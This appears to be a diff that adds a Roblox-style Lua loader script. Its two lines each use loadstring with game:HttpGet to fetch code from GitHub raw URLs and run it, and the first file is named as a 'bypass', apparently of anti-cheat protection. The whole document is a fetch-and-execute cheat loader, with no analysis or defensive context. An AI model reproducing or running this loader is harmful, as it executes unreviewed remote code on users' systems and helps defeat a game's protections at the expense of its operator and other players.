@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/emkodelirdi/EmkoDelirdi/main/ut3dbbbypass"))()
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/emkodelirdi/EmkoDelirdi/main/ut3dbb"))()
